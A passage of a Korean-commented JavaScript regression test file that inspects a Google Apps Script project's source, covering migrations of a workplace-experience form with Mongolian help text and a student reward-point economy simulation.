    '탭 대조 실패 안내 셋이 서로 다른 말을 내지 않는다: ' + JSON.stringify(대조실패, null, 1));
  assert.ok(!/다른 폼/.test(대조실패['어느 폼에도 안 붙음']) && !/다른 폼/.test(대조실패['연결을 못 읽음']),
    '폼에 안 붙었거나 못 읽은 탭을 「다른 폼」이라 말한다 — 찾아갈 폼이 없다');
  assert.ok(!/「양식」/.test(대조실패['어느 폼에도 안 붙음']),
    '폼에 안 붙은 시트에 탭의 「양식」 메뉴를 열라고 시킨다 — 그 메뉴는 폼에 붙은 탭에만 있다(못 따르는 처방)');
  /* 🔴 [①배포 검수 6ae0f9351269 채택] 문서 제목은 «신원»이 아니라 곁다리 증거다 — 남이 제 폼에 그대로
   * 붙일 수 있는 이름이라, 그것만으로 「우리 폼」이라 판정하면 통로마다 문이 하나씩 열린다(같은 뿌리를
   * 세 번 짚였다: ed25df351411 · ed44cb1528a8 · 이것). 그래서 되돌아보기를 «켜야 켜지는» 것으로 바꿨다 —
   * 둘째 인자는 「우리 응답 탭이 바로 이 폼에 붙어 있음을 부르는 쪽이 확인했다」는 뜻이다.
   * 켜는 곳은 셋뿐: 탭이 준 폼(f0) · 탭 대조를 이미 통과한 마이그레이션 둘. 그 밖은 엄격이다. */
  assert.ok(/if \(!탭연결확인됨\) return '';/.test(제목자),
    '문서 제목 되돌아보기가 «켜야 켜지는» 것이 아니다 — 남이 붙인 파일 이름만으로 남의 폼이 통과한다');
  assert.ok(/직장폼서명_\(f0, true\)/.test(body),
    '탭이 준 폼(f0)에서 곁다리 증거를 안 켠다 — 설문지 제목이 빈 옛 폼을 복구 경로가 못 알아본다');
  // 워치독도 「이름이 같은 탭」을 그 폼의 탭으로 믿지 않는다(①배포 검수 b073a11c3a3e)
  assert.ok(/shWk\.getFormUrl\(\)[\s\S]{0,40}indexOf\(wkId\)/.test(code), '워치독이 응답 탭과 폼의 연결을 대조하지 않는다 — 갈아 끼워진 탭의 행을 직장 경험으로 센다');
  // ID 가 없으면 «검증 못 한 것»이지 정상이 아니다 — 세면 옛 탭의 행이 그럴듯한 회수량으로 찍힌다(①배포 검수 12f7d19f598f)
  assert.ok(/if \(shWk && !wkId\)[\s\S]{0,400}행 수를 세지 않았습니다/.test(code), '직장폼ID 가 없을 때 워치독이 미검증으로 표시하지 않는다');
  // create 에 «체이닝을 붙이지 않는다» — 체인 안에서 실패하면 ID 저장 줄에 도달하지 못해 폼이 고아가 된다(①배포 검수 e21f3cec0b41)
  assert.ok(/FormApp\.create\(WORK_FORM_TITLE\);\s/.test(body), 'FormApp.create 에 설정 체인이 붙어 있다 — 체인 실패 시 폼 ID 를 못 적는다');
  // 제목은 고유하지 않다 — 복사본·동명 폼을 거르려면 «이 폼을 이 폼이게 하는» 필수 두 칸까지 본다(①배포 검수 728e50c7d939)
  /* 제목은 고유하지 않다 — 복사본·동명 폼을 거르려면 «이 폼을 이 폼이게 하는» 필수 두 칸까지 본다(①배포 검수 728e50c7d939).
   * 🔑 그 자는 «하나»여야 한다(①배포 검수 550ba898c5dd) — 찾는 자리와 고치는 자리가 다른 자를 쓰면
   * 느슨한 쪽 문으로 남의 폼이 들어온다(실제로 마이그레이션이 제목만 보고 있었다). */
  assert.ok(/function 직장폼서명_\(form[\s\S]{0,400}indexOf\('시킨 일 그대로'\) !== -1 && t\.indexOf\('예정에 없던 일이 생긴 적'\) !== -1/.test(code),
    '폼 서명 공용 자(직장폼서명_)가 없거나 필수 두 칸을 안 본다');
  assert.ok(/if \(직장폼서명_\(f0, true\)\)/.test(body), '복구 경로가 공용 서명 자를 쓰지 않는다 — 제목만 같은 남의 폼이 데이터 소스가 된다');
  const 생성끝 = body.slice(body.indexOf('FormApp.create('));
  assertOrder(생성끝, ['linkFormTab_(ss, before, WORK_TAB)', "setState(st, '직장폼완료', 'y')"]);
  // 워치독 — 폼 생존 + 회수량(설계 준비도)
  assert.ok(code.includes("['직장폼ID', '직장 경험 폼(VR 직업체험 0단계)'"), '워치독 폼 생존 큐에 직장폼이 없다');
  assert.ok(code.includes("ss.getSheetByName('직장기록_응답')"), '워치독 회수 건수 표기가 없다');
});

test('[v9.270] 🇲🇳 직장 경험 폼 몽골어 — 안내문 정본 하나 · 라이브 폼에 닿는 통로 · 제목 불변', () => {
  const 정본 = section('const WORK_DESC =', 'function createWorkLogForm()');
  /* 🔑 진짜 급소는 «읽기»가 아니라 «쓰기»다 — 한국어로 써야 한다고 생각하면 「혼났던 일」이 한 줄로 줄어든다.
   * 폼 설명 끝의 이 한 줄이 병기 전체보다 회수 «품질»을 더 바꾼다. */
  assert.ok(/Монголоор хариулж болно/.test(정본), '폼 설명에 「몽골어로 답해도 된다」가 없다 — 병기만으로는 답변 길이가 안 바뀐다');
  // 채점 축 넷의 칸은 전부 몽골어를 갖는다 — 축 하나가 한국어로 남으면 그 축의 재료만 얕게 걷힌다
  ['시킨 일 그대로', '못 알아들었을 때 어떻게 했나요', '예정에 없던 일이 생긴 적', '그때 누구에게 어떻게 알렸나요',
    '하지 말라고 들은 것', '말투·호칭 때문에 곤란했던 일', '자료활용동의'].forEach(k => {
    const m = new RegExp("'" + k.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + "':([\\s\\S]{0,900}?)(\\n  '|\\n\\};)");
    const seg = 정본.match(m);
    assert.ok(seg, `WORK_HELP 에 「${k}」 항목이 없다`);
    assert.ok(/[Ѐ-ӿ]/.test(seg[1]), `「${k}」 안내에 몽골어(키릴)가 없다`);
  });
  // 생성부와 마이그레이션이 «같은 상수»를 본다 — 두 곳에 적으면 「새로 만든 폼」과 「고친 폼」이 갈린다
  assert.ok(/form\.setDescription\(WORK_DESC\)/.test(code), '생성부가 폼 설명 정본(WORK_DESC)을 쓰지 않는다');
  /* ⚠ 끝 앵커는 «바로 다음 함수»여야 한다(v9.293) — 구판은 `/* ── [v9.89]` 였는데 그 사이에
   * migrateFormCopy0901 이 이미 있었고, v9.293 에 migrateWorkFormOutcome 이 하나 더 들어오면서
   * «남의 함수의 setTitle» 을 이 함수의 것으로 읽어 빨개졌다. 구간은 재는 대상만 덮는다. */
  const mig = section('function migrateWorkFormMn()', 'function migrateWorkFormOutcome()');
  assert.ok(/form\.setDescription\(WORK_DESC\)/.test(mig) && /it\.setHelpText\(WORK_HELP\[title\]\)/.test(mig),
    '마이그레이션이 안내문 정본을 쓰지 않는다');
  /* 「이미 있으면 스킵」이 아니라 «정본과 다르면 갱신» — v9.103 이 그 구멍이었다(스킵이라 문구 개정이
   * 라이브에 영영 안 닿았고 학생이 읽는 문장은 옛것으로 남았다). */
  assert.ok(/!==\s*WORK_DESC/.test(mig) && /!==\s*WORK_HELP\[title\]/.test(mig),
    '마이그레이션이 정본 대조 없이 스킵한다 — 문구를 고쳐도 라이브 폼에 안 닿는다');
  // 제목·선택지는 건드리지 않는다 — 제목은 응답 시트 헤더이자 폼 서명이자 궤적 조인 키다
  assert.ok(!/setTitle\(/.test(mig) && !/setChoiceValues\(/.test(mig), '마이그레이션이 제목·선택지를 건드린다 — 헤더·서명·조인 키가 갈린다');
  // 엉뚱한 폼을 고치지 않는다 + 못 찾은 문항을 조용히 넘기지 않는다
  assert.ok(/if \(!직장폼서명_\(form, true\)\)/.test(mig), '마이그레이션이 «찾는 자리»와 같은 서명 자를 쓰지 않는다 — 동명 복사본의 안내를 통째로 덮어쓴다');
  /* 🔴 [①배포 검수 6ae0f9351269] 곁다리 증거(문서 제목)를 켜려면 «먼저» 응답 탭 대조를 통과해야 한다 —
   * 순서가 곧 안전이다. 뒤에 두면 서명이 남이 붙인 파일 이름만으로 남의 폼을 「우리 폼」이라 부른다. */
  assertOrder(mig, ['const shT = ss.getSheetByName(WORK_TAB)', 'if (!tabOk)', '직장폼서명_(form, true)']);
  /* 🔴 [①배포 검수 ed25df351411 채택] 쓰기 전에 «응답이 오는 폼»인지까지 본다. 설문지 제목이 비면
   * 신원을 문서 제목(Drive 파일 이름)으로 보는데 그 이름은 **남이 제 폼에 붙일 수 있는** 값이라,
   * 문항 두 개까지 흉내 낸 폼을 직장폼ID 에 꽂으면 이 통로가 그 폼을 덮어쓸 수 있었다.
   * 응답 탭이 «어느 폼에» 붙어 있는지는 우리 시트의 setDestination 이 정한다 — 남이 못 고치는 자다.
   * 결과 칸 통로는 이미 이 자를 쓰고 있었다(codex P1 c1bc92a6a834) — 여기만 없어서 그 문으로 샜다. */
  assert.ok(/shT\.getFormUrl\(\)[\s\S]{0,60}indexOf\(form\.getId\(\)\)/.test(mig) && /if \(!tabOk\)/.test(mig),
    '몽골어 통로가 응답 탭↔폼 연결을 대조하지 않는다 — 문서 제목만 흉내 낸 남의 폼을 덮어쓸 수 있다');
  assert.ok(/못찾음\.push\(title\)/.test(mig) && /못 찾은 문항/.test(mig), '제목이 갈린 문항을 조용히 넘긴다 — 그 문항만 한국어로 남는다');
  // 발동 조건이 같은 커밋에 있어야 한다(CLAUDE.md) — 시트 메뉴가 없으면 유호님이 부를 길이 없다
  assert.ok(code.includes("function menuMigrateWorkFormMn()") && code.includes("'menuMigrateWorkFormMn'"),
    '몽골어 반영을 부르는 시트 메뉴가 없다 — 라이브 폼에 닿을 길이 없다');
});


test('[v9.293] 🎯 직장 경험 폼 결과 칸 셋 — 선택 유지 · 기존 문항 무손 · 라이브 통로 · 발동 조건', () => {
  /* 왜 이 회귀가 있나: 이 마이그레이션은 «살아 있는 폼에 문항을 더하는» 유일한 통로다. 여기서
   * 기존 문항의 제목·선택지를 건드리면 응답 시트 헤더·폼 서명·궤적 조인 키가 한꺼번에 갈린다.
   * 그리고 결과 칸이 «필수»가 되면 과정 칸(이 폼의 1순위 자산)까지 회수율이 같이 죽는다. */
  const 생성부 = section('function createWorkLogForm_(', 'function migrateWorkFormMn()');
  ['얼마나 오래 다녔나요', '왜 그만두게 되었나요', '다시 간다면'].forEach(t => {
    assert.ok(생성부.includes("mc('" + t + "'"), `생성부에 결과 문항 「${t}」이 없다 — 새로 만드는 폼에 안 들어간다`);
    const m = 생성부.match(new RegExp("mc\\('" + t + "',[^;]*?;"));
    assert.ok(m && /,\s*false\s*,/.test(m[0]), `결과 문항 「${t}」이 «선택»이 아니다 — 필수로 걸면 과정 칸까지 회수율이 죽는다`);
  });
  // 필수 목록은 다섯 그대로 — 결과 칸이 슬그머니 필수가 되지 않게 못 박는다
  const req = section('const WORK_REQUIRED_ =', 'function 직장폼서명_');
  ['얼마나 오래 다녔나요', '왜 그만두게 되었나요', '다시 간다면'].forEach(t => {
    assert.ok(!req.includes(t), `WORK_REQUIRED_ 에 결과 문항 「${t}」이 들어갔다 — 필수는 다섯 그대로여야 한다`);
  });
  // 선택지·안내문이 정본 상수 하나에서만 나온다(두 곳에 적으면 새 폼과 고친 폼이 갈린다)
  assert.ok(/const WORK_TENURES = \[/.test(code) && /const WORK_EXITS = \[/.test(code), '결과 칸 선택지 정본 상수가 없다');
  ['얼마나 오래 다녔나요', '왜 그만두게 되었나요', '다시 간다면'].forEach(k => {
    const seg = section("const WORK_HELP", "const WORK_REQUIRED_").match(new RegExp("'" + k + "':([\\s\\S]{0,600}?)(\\n  '|\\n\\};)"));
    assert.ok(seg && /[Ѐ-ӿ]/.test(seg[1]), `결과 문항 「${k}」 안내에 몽골어(키릴)가 없다`);
  });
  const out = section('function migrateWorkFormOutcome()', 'function migrateFormCopy0901()');
  // 엉뚱한 폼을 고치지 않는다 — «찾는 자리»와 같은 서명 자
  assert.ok(/if \(!직장폼서명_\(form, true\)\)/.test(out), '결과 칸 통로가 서명 자를 안 쓴다 — 동명 복사본에 문항을 붙인다');
  /* 🔴 [2026-09-03 라이브 실패] 제네릭 Item 에는 isRequired·setRequired 가 없다 — getItems() 로 꺼낸 문항에
   * 그대로 부르면 라이브가 「이미.isRequired is not a function」으로 죽는다. 유호님이 시트 메뉴에서 만나셨다.
   * 🔑 이 결함은 v9.295(09-02)부터 있었는데 소스층 회귀는 그 내내 «전부 초록»이었다 — 서명 검사가 늘 먼저
   *   거절해서 그 줄에 닿지 못했기 때문이다. 실행층에서만 드러나는 자리라, 자를 소스 구조로라도 세워 둔다. */
  assert.ok(!/이미\.(isRequired|setRequired)\(/.test(code),
    '결과 칸 통로가 제네릭 문항에 isRequired·setRequired 를 부른다 — 라이브에서 「is not a function」으로 죽는다');
  assert.ok(/const 이미MC = 이미\.asMultipleChoiceItem\(\)/.test(out) && /이미MC\.isRequired\(\)/.test(out),
    '객관식으로 «한 번 바꿔 두고» 쓰지 않는다 — 같은 자리에서 또 갈린다');
  // 곁다리 증거를 켜기 «전»에 응답 탭 대조를 통과해야 한다(①배포 검수 6ae0f9351269 · 몽골어 통로와 같은 규율)
  assertOrder(out, ['const shT = ss.getSheetByName(WORK_TAB)', 'if (!tabOk)', '직장폼서명_(form, true)']);
  /* [v9.294] codex P1 c1bc92a6a834 — 서명은 「직장 폼처럼 생겼다」까지만 말한다. 응답 탭에 «안 붙은»
   * 폼에 문항을 붙이면 회수는 0인데 보고는 성공이라, 조용한 실패가 된다. 생성 경로와 같은 자를 쓴다. */
  assert.ok(/shT\.getFormUrl\(\)[\s\S]{0,60}indexOf\(form\.getId\(\)\)/.test(out) && /if \(!tabOk\)/.test(out),
    '결과 칸 통로가 응답 탭↔폼 연결을 대조하지 않는다 — 응답이 안 오는 폼에 문항이 붙는다');
  /* [v9.294] codex P1 74f473751ae0 — 「없으면 만든다」라 둘이 동시에 「없다」를 읽으면 둘 다 만든다.
   * 잠금은 래퍼가 잡고 알림은 «해제 뒤»에 보낸다(adminMail 이 같은 비재진입 락을 다시 잡는다). */
  const outWrap = section('function migrateWorkFormOutcome()', 'function migrateWorkFormOutcome_(');
  assert.ok(/LockService\.getScriptLock\(\)/.test(outWrap) && /tryLock\(30000\)/.test(outWrap),
    '결과 칸 통로에 잠금이 없다 — 메뉴를 두 번 누르면 문항이 두 벌로 붙는다');
  assert.ok(/finally \{[\s\S]{0,200}releaseLock\(\)[\s\S]{0,200}지연알림/.test(outWrap),
    '잠금 해제·지연 알림 순서가 없다 — adminMail 이 같은 락을 다시 잡아 알림이 죽는다');
  assert.ok(!/adminMail\(/.test(section('function migrateWorkFormOutcome_(', 'function migrateFormCopy0901()')),
    '결과 칸 본체가 잠금 «안»에서 adminMail 을 부른다(비재진입 락)');
  /* [2026-09-03] codex P3 85ea109cbb73·8741ad6a9822 — 설문지 제목 치유는 «맨 먼저» 일어난다.
   * 그 뒤 쓰기가 던지면 라이브 폼의 제목은 이미 바뀐 채인데 사람에게 가는 것은 「실패」뿐이라,
   * 「제목이 왜 바뀌었지」를 다음 사람이 못 잇는다. 두 통로가 «모양은 달라도» 같은 값을 내야 한다:
   *   · 결과 칸 = 래퍼가 상자로 받아 catch 에서 알림을 세우고 finally 가 보낸다(잠금 규율 유지)
   *   · 몽골어 안내 = 래퍼가 없어(멱등이라 잠금 불필요) 본체가 직접 감싼다 */
  assert.ok(/catch \(e\) \{[\s\S]{0,400}제목치유흔적[\s\S]{0,600}throw e/.test(outWrap),
    '결과 칸 래퍼가 «제목만 고치고 멈춘» 경로를 안 알린다 — 라이브 제목이 왜 바뀌었는지 못 잇는다');
  assert.ok(/치유기록\(제목치유\)/.test(section('function migrateWorkFormOutcome_(', 'function migrateFormCopy0901()')),
    '결과 칸 본체가 치유 사실을 래퍼로 안 흘린다 — 상자가 비어 위 알림이 영영 안 선다');
  const mnBody = section('function migrateWorkFormMn()', '/* ── [v9.293]');
  assert.ok(/catch \(e\) \{[\s\S]{0,600}제목치유[\s\S]{0,600}throw e/.test(mnBody),
    '몽골어 안내 통로가 «제목만 고치고 멈춘» 경로를 안 알린다(이쪽은 래퍼가 없어 본체가 감싼다)');
  /* [v9.294] codex P2 e5ca1be011e6 — 첫 실행에서 문항은 붙고 moveItem 만 실패한 폼(v9.182 의 실제 모양)은
   * 「있으면 넘긴다」로는 영영 안 고쳐진다. 있는 것도 자리·유형을 다시 재고, 못 고치는 것은 보고한다. */
  assert.ok(/자리 교정/.test(out) && /어긋남/.test(out),
    '재실행이 «있는 문항»의 자리·형상을 안 본다 — 이동만 실패한 폼이 영영 동의 뒤에 남는다');
  assert.ok(/이미\.getType\(\) !== FormApp\.ItemType\.MULTIPLE_CHOICE/.test(out),
    '유형이 다른 동명 문항을 그대로 고친다 — 쌓인 응답이 못 읽히는 열로 남는다');
  /* [v9.295] codex P2 cac3eb180b2d·P3 2aeaea5e5970 — v9.294 는 머리를 «동의 앞»으로 옮겼는데,
   * 문항이 이미 동의 앞인 부분 실행 상태에서는 그 자리가 곧 «문항들 뒤»라 머리가 제 문항 뒤에 남았고
   * 재실행해도 안 수렴했다. 과녁은 동의가 아니라 **첫 결과 문항**이어야 하고, 문항을 다 놓은 «뒤»에 돈다. */
  assert.ok(/Math\.min\.apply\(null, 문항자리들\)/.test(out) && /const 문항자리들 = 결과문항\.map/.test(out),
    '머리 과녁이 «첫 결과 문항»이 아니다 — 머리가 제 문항 뒤에 남는 부분 실행 상태가 안 풀린다');
  assert.ok(out.indexOf('머리교정();') > out.indexOf('결과문항.forEach'),
    '머리 교정이 문항 반복문 «앞»에서 돈다 — 그 시점의 문항 자리는 아직 참이 아니다');
  /* [v9.295] codex P2 ea5f2cc4e7cf — 결과 칸은 «선택»이 계약이다. 손으로 필수를 켠 폼에서 이 통로가
   * 그대로 두면 빈 칸으로 못 내는 응답자가 과정 칸까지 통째로 버린다. 푸는 방향만 자동으로 고친다. */
  /* ⚠ 이 자가 09-02~09-03 내내 «망가진 모양»을 못박고 있었다 — 정규식이 `이미.isRequired()` 를 요구했는데
   * 그게 바로 라이브에서 죽는 호출이었다. 자가 결함을 «지키고» 있으면 회귀는 영원히 초록이다.
   * 그래서 유형을 바꿔 둔 이름(이미MC)으로 요구를 옮긴다 — 위 §「제네릭 Item」 주석이 까닭이다. */
  assert.ok(/이미MC\.isRequired\(\)\) \{ 이미MC\.setRequired\(false\)/.test(out),
    '기존 결과 문항의 «필수»를 선택으로 되돌리지 않는다 — 계약이 안 선다');
  assert.ok(!/setRequired\(true\)/.test(out), '결과 칸 통로가 문항을 «필수로» 켠다 — 선택이 계약이다');
  /* [v9.294] codex P2 5f735ab55dce — 재직 기간 구간이 겹치면 정확히 3·6·12개월인 사람이 두 칸에 걸리고
   * 그 임의성이 곧 등급 경계의 사전 분포를 흔든다. 겹치는 표기(`N~M개월` 의 M 이 다음 칸의 시작)를 막는다. */
  const 기간 = section('const WORK_TENURES =', 'const WORK_EXITS =');
  assert.ok(!/'1~3개월'|'3~6개월'|'6개월~1년'/.test(기간), '재직 기간 구간이 겹친다 — 경계값이 두 칸에 해당한다');
  /* ⚠ 과녁을 WORK_TENURES «만»으로 좁힌 까닭: 기존 §2 문항 「일한 기간」에도 같은 겹침이 있으나
   * 그건 **라이브에 응답이 쌓인 선택지**라 고치면 옛 응답이 미아가 된다(제목·선택지 불변 규율).
   * 아는 채로 안 고치는 것이지 못 본 것이 아니다 — 트랙 §9-SHIFT 에 적었다. */
  // 기존 «문항»의 제목·선택지 불변: setTitle 은 섹션 헤더에만 · setChoiceValues 는 새로 만든 항목에만
  const 제목쓰기 = out.match(/\.setTitle\(/g) || [];
  const 섹션제목 = out.match(/addSectionHeaderItem\(\)\.setTitle\(/g) || [];
  const 새문항제목 = out.match(/addMultipleChoiceItem\(\)\.setTitle\(/g) || [];
  const 섹션번호 = out.match(/it\.setTitle\(p\[1\]\)/g) || [];
  assert.equal(제목쓰기.length, 섹션제목.length + 새문항제목.length + 섹션번호.length,
    '결과 칸 통로가 «기존 문항»의 제목을 고친다 — 응답 헤더·서명·조인 키가 갈린다');
  /* 선택지 쓰기는 둘뿐이고 «둘 다 안전한 자리»여야 한다 — ①새로 만드는 항목의 체인
   * ②이미 있는데 선택지가 «비었을 때»만(v9.294 · 값이 있으면 옛 응답이 그 문자열에 묶여 있어 안 고친다). */
  const 선택지쓰기 = out.match(/\.setChoiceValues\(/g) || [];
  const 생성체인 = out.match(/addMultipleChoiceItem\(\)\.setTitle\([^)]*\)\.setChoiceValues\(/g) || [];
  const 빈칸채움 = out.match(/if \(!지금선택\.length\) \{ 이미MC\.setChoiceValues\(/g) || [];
  assert.equal(선택지쓰기.length, 생성체인.length + 빈칸채움.length,
    '결과 칸 통로가 «기존 문항»의 선택지를 무조건 고친다 — 옛 응답이 그 값에 묶여 있다');
  assert.ok(빈칸채움.length === 1 && /지금선택\.join\('␟'\) !== q\[1\]\.join\('␟'\)/.test(out),
    '선택지가 정본과 다를 때 «고치지 않고 보고»하는 갈래가 없다');
  // 멱등 — 있으면 안 만들고, 안내문만 정본과 대조해 갱신한다
  assert.ok(/if \(이미\)/.test(out) && /!==\s*WORK_HELP\[q\[0\]\]/.test(out), '결과 칸 통로가 멱등이 아니거나 안내문을 정본과 대조하지 않는다');
  // 자리 이동은 인덱스·인덱스 오버로드로만(v9.182 라이브 결함) · 못 찾으면 조용히 끝에 두지 않는다
  assert.ok(/form\.moveItem\([^,]*getIndex\(\), *목표\)/.test(out), '자리 이동이 인덱스 오버로드가 아니다 — 아이템 오버로드는 라이브에서 던진다(v9.182)');
  assert.ok(/앵커없음\.push/.test(out) && /맨 끝/.test(out), '동의 섹션을 못 찾았을 때 조용히 끝에 붙인다 — 보고에 안 뜬다');
  // 발동 조건이 같은 커밋에(CLAUDE.md) — 메뉴가 없으면 유호님이 부를 길이 없다
  assert.ok(code.includes('function menuMigrateWorkFormOutcome()') && code.includes("'menuMigrateWorkFormOutcome'"),
    '결과 칸을 라이브에 넣는 시트 메뉴가 없다 — 08-27 에 선 폼은 영영 결과 칸을 못 받는다');
});


// ── [v9.83] 💰 포인트 경제 ─────────────────────────────────────────────────────
// 이 세 테스트가 존재하는 이유: v9.83 이전의 결함은 "누가 숫자를 잘못 썼다"가 아니라
//   **지급 단가가 10곳에 흩어져 있어 아무도 총합을 볼 수 없었다**는 것이다(경로 6개가 늘도록 실측 2배 인플레).
//   그래서 단가 하나만 보지 않고 여기서 월간 소득 총합을 실제로 계산해 스토어·진화 앵커와 대조한다.
function constObj_(startMarker) { // Code.js의 `const X = { 키: 숫자 }` 블록을 주석 무시하고 파싱
  const raw = section(startMarker, '\n};');
  const o = {};
  코드만(raw).replace(/([가-힣A-Za-z_]+)\s*:\s*(\d+)/g, (m, k, v) => { o[k] = Number(v); return m; });
  return o;
}

test('[v9.83] 포인트 경제 — 월간 소득 시뮬이 과잠·진화 앵커를 넘지 않는다', () => {
  const PT = constObj_('const PT = {');
  const D = 21.7, W = 4.3; // 평일반 월 수업일 · 월 주수

  // 지급 경로 전수 — Code.js가 실제로 발행하는 사유와 1:1. 새 경로가 생기면 여기에 반드시 추가할 것.
  const paths = {
    숙제: PT.숙제 * D, 출석: PT.출석 * D, 첨삭확인: PT.첨삭확인 * D,
    칭찬: PT.칭찬 * 8.7, 인정: PT.인정 * 2.2, 레이드: PT.레이드 * W, // [08-27] 키 왕관 → 인정
    월드: PT.월드 * 0.5, 개근: PT.개근, 생일: PT.생일 / 12, // [08-27] 키 개근왕 → 개근 · 리그 경로 «삭제»(유호 지시 A · 반 대항 리그 폐지)
    // [v9.147] 기능 압축 — 데이터를 낳는 행동으로 옮긴 두 경로. 상한이 코드에 실제로 걸려 있다:
    //   재작성 = 주 1회(REWRITE_COOLDOWN_DAYS) · 퀴즈응답 = 1일 1회(DAILY_LIMIT)
    재작성: PT.재작성 * W, 퀴즈응답: PT.퀴즈응답 * D
  };
  const hard = Object.keys(paths).reduce((a, k) => a + paths[k], 0); // 열심히 = 전 경로 만점
  assert.equal(Object.keys(PT).length, 12, 'PT 항목 수가 바뀌었다 — 새 지급 경로를 이 시뮬에 넣고 상한을 다시 판정할 것'); // [08-27] 13→12 (리그 폐지)
  /* [v9.147→08-27] ⚠ 월드는 시즌 오프(WORLD_RAID_ON=false)라 지금은 0P 지만 시뮬에서 빼지 않는다 —
   *   상수 한 줄로 되살아나는 경로이고, 그때 상한을 다시 재는 사람이 없으면 인플레가 조용히 복귀한다.
   *   🔑 리그는 다르다: 08-27 유호 지시 A 로 «통째로 걷혔다»(상수·함수·배선 전부). 되살아날 한 줄이
   *      없으므로 시뮬에서도 뺀다 — 없는 경로를 상한에 넣으면 상한이 실제보다 후해진다. */

  // ① 유호 07-31 기준: 성실한 학생이 과잠(1,700P)에 6개월 안에 닿으면 안 된다
  assert.ok(hard <= 310, '열심히 월 소득 ' + Math.round(hard) + 'P — 상한 310P 초과(포인트가 다시 후해졌다)');
  assert.ok(hard >= 250, '열심히 월 소득 ' + Math.round(hard) + 'P — 하한 250P 미달(모으는 재미가 죽는다)');
  assert.ok(1700 / hard >= 5, '과잠 도달 ' + (1700 / hard).toFixed(1) + '개월 — 5개월 미만이면 인플레 재발');
  // ② [함께한날 막6] 구 앵커(싱크마스터 2,400P ≥ 7개월)는 은퇴 — 성장 축이 포인트에서 «함께한 날·맞힌 말»로
  //    옮겨 가 이 산수의 과녁이 사라졌다(설계 §4-8 ⑨). 장면 사다리의 완급은 tests/함께한날.test.js 가 잰다
  //    (첫 4주 4장면 · 간격 확대 · 30/60/100 회피 · 말 문턱 ≤ 뱅크 — 뱅크 수는 그 검사가 엔진에서 읽는다).
  // ③ 과잠 성실 하한은 "12개월 다녔지만 거의 안 나온 학생"만 걸러야 한다 — 보통 학생(열심히의 60%)은 통과
  const JMIN = Number(code.match(/const JACKET_MIN_POINTS = (\d+)/)[1]);
  const JMON = Number(code.match(/const JACKET_TENURE_MONTHS = (\d+)/)[1]);
  assert.ok(hard * 0.6 * JMON > JMIN * 1.3, '과잠 누계 하한 ' + JMIN + 'P가 보통 학생 ' + JMON + '개월치에 비해 빡빡하다');

  // ④ 배선 — 지급 지점이 숫자를 직접 쓰지 않고 PT를 참조하는가(인플레 재발의 유일한 경로 차단)
  // 지급 행 리터럴 `[대상, <숫자>, '사유'` 가 남아 있으면 PT를 우회한 것 — 데모 시더(pushPl)는 대상이 아니다
  const litRe = /\[\s*(?:sid|r\[0\]|pr\[0\])\s*,\s*\d+\s*,\s*'([^']+)'/g;
  const bypass = [];
  let mm;
  while ((mm = litRe.exec(code)) !== null) bypass.push(mm[1]);
  assert.deepEqual(bypass, [], '숫자를 직접 쓴 지급 지점이 남아 있다: ' + bypass.join(', '));
  assert.ok(code.includes('const AI_FEEDBACK_ACK_POINTS = PT.첨삭확인'), '첨삭확인 보상이 PT에서 분리됐다');
  assert.ok(code.includes('d * PT.출석'), '출석 정산이 PT를 안 쓴다');
  assert.ok(code.includes('[PT.개근,') && code.includes('[PT.레이드영웅,'), '칭호 보너스가 PT를 안 쓴다');
  // 🔴 [08-27] 칭호 이름을 갈면 보너스표도 «같은 커밋»에서 따라가야 한다 — 안 따라가면 보너스가 조용히 0이 된다(이번에 실제로 냈다).
  assert.ok(code.includes("'🌟 하루도 안 빠진 달': [PT.개근"), '칭호 개명이 보너스표에 안 따라갔다 — 개근 보너스가 죽는다');
  assert.ok(code.includes("'🤝 레이드 개근': [PT.레이드영웅"), '칭호 개명이 보너스표에 안 따라갔다 — 레이드 보너스가 죽는다');
  // 🚫 1등 시상 칭호 일곱이 되살아나지 않는다(유호 08-27 「비교하는거 최대한 없애자」)
  // 🔑 칭호 «문자열 그대로»로 잰다 — 낱말만 재면 리그 시트 열 「챔피언반」 같은 것이 오탐으로 걸린다.
  ['🧠 시냅스 챔피언', '🚀 로켓 성장', '🐎 다크호스', '🏋️ 우리 반 캐리', '📚 숙제왕', '💝 정성왕', '🌟 이달의 스타']
    .forEach(t => assert.ok(!코드정제.includes(t), '1등 시상 칭호 「' + t + '」가 되살아났다'));

  // ⑤ [리뷰 B1] **표기가 실지급의 2배를 약속하던 사고의 재발 방지.** 상수만 모으고 화면·메일 문자열 8곳을
  //    옛 숫자로 남겨 학생에게 "+10P"라고 말하면서 5P를 주고 있었다. 지급 지점보다 오히려 이쪽이 눈에 띈다.
  //    코드 줄(주석 제외)에 PT를 안 거친 '+숫자P' 문자열이 있으면 실패시킨다.
  const claims = [];
  // [v9.87] split('\n') → split(/\r?\n/): CRLF 체크아웃에서 줄 끝에 남는 \r 때문에 아래 주석 제거가 통째로
  //   죽어 있었다(정규식 `.`은 \r을 매치하지 않아 `$`가 문자열 끝에 닿지 못해 replace가 무동작).
  //   결과 = 꼬리 주석의 "+5P·+3P" 4건이 위반으로 잡혀 master가 상시 실패 → 전 트랙 배포 게이트가 막혀 있었다.
  //   같은 커밋이 체크아웃 줄바꿈 설정에 따라 통과/실패가 갈리던 것이라 회귀 장치로서도 신뢰 불가였다.
  code.split(/\r?\n/).forEach((ln, i) => {
    const t = ln.trim();
    if (t.startsWith('*') || t.startsWith('//') || t.startsWith('/*')) return; // 버전 이력 주석은 역사라 그대로 둔다
    if (/\+\s?\d+\s?P(?![a-zA-Z가-힣])/.test(ln.replace(/\/\/.*$/, ''))) claims.push((i + 1) + ': ' + t.slice(0, 90));
  });
  // 유일한 예외: 몽골어 응원 문구 "어제의 자신보다 정확히 +1P 더" — 지급 약속이 아니라 최소 단위 비유이고
  //   단가가 어떻게 바뀌어도 참이다. 다른 예외를 늘리려면 그 자리에 진짜 지급 약속이 없는지 먼저 확인할 것.
  const left = claims.filter(c => !c.includes('+1P'));
  assert.deepEqual(left, [], '화면·메일 문구가 PT를 안 거친 포인트를 약속한다:\n' + left.join('\n'));
});

test('[v9.83] 과잠 자격 — 스토어 하차 + 재원 게이트 + 잔액 무차감', () => {
  // 과잠이 스토어에 남아 있으면 학생은 자격까지 간식·굿즈를 한 번도 못 산다(하위 티어 루프 사망).
  assert.ok(!코드정제.includes("'싱크 과잠','의류'"), '싱크 과잠이 아직 스토어 상품으로 팔린다');
  assert.ok(code.includes('function jacketWatch_'), '과잠 자격 워처가 없다');
